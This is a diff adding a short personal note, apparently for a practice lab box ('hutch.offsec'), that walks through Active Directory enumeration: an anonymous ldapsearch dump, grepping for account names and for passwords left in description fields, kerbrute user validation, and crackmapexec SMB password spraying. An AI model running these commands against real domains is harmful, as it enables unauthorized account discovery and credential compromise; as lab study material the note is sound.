@@ -1,0 +1,29 @@
+Basically all active directory machine used LDAP port
+And LDAP port is used for save the information about system .
+Now first we try to find out information about system using ldabsearch tool
+
+1. ldapsearch -x -h *targetIP* -b "dc=hutch,dc=offsec" > targetinfo.txt
+
+2. cat targetinfo.txt | grep -i "samaccountname"
+
+Copy the all users and save to users.txt
+Next tool used for kerbrute and kerbrute used for identification of valid users 
+
+3. kerbrute -domain <target.domain> -users ./users.txt -dc-ip  <targetIP>
+
+Now you see who user is valid I think all users is valid if any user are invalid then it's great you identify the fake user and remove the fake user from users.txt
+
+4. cat targetinfo.txt | grep -i "discription"
+
+See all discriptions with full mind use and now you see password and copy the password and save pass.txt
+Now we have a pass but we don't know which user pass so, let's identify which user pass.
+
+5. crackmapexec smb <targetIP> -u ./users.txt -p ./pass.txt --continue-on-success
+
+I use continue on success function for if pass valid for two users then great for we but we find a only one users pass it's ok 
+
+Now we have a localusername and pass now continue active Directory notes part 2
+
+-------------
+HAPPY HACKING 
+-------------
